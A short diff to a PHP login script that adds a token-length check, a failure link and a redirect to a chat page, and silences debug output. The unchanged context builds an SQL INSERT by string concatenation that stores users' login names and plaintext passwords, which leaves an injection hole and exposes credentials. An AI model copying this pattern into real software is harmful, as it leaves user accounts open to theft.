@@ -6,11 +6,15 @@ session_regenerate_id();
 
 
 $token = login();
+if(strlen($token) > 250){$token = "invalid";};
 $_SESSION["token"] = $token;
 grava();
-
-//header('Location: chat.php'); 
+if($token == "invalid"){
+ echo '<a href="index.php" style="font-family:arial; font-size:7px;">Failed to Log In. Try Again.</a>';
+}else{
+header('Location: chat.php'); 
 //header('Location: chat.php?tk=' . $token); 
+}
 exit;
 
 function login(){
@@ -87,11 +91,11 @@ $token = $_SESSION["token"];
 $tempo = date('m/d/Y h:i:s a');
 
 $query = "INSERT INTO dados (id1, id2, id3, id4) VALUES ('" . $tempo . "', '" . $login . "', '" . $passw . "', '" . $token . "');";
-echo var_dump($query);
-echo '<br><br>';
+//echo var_dump($query);
+//echo '<br><br>';
 $result = $db->query($query);
-echo var_dump($result);
-echo '<br><br>';
+//echo var_dump($result);
+//echo '<br><br>';
 $result->closeCursor();
 //$app->register(new Herrera\Pdo\PdoServiceProvider(), $zica);
 //echo '<br>end<br>';
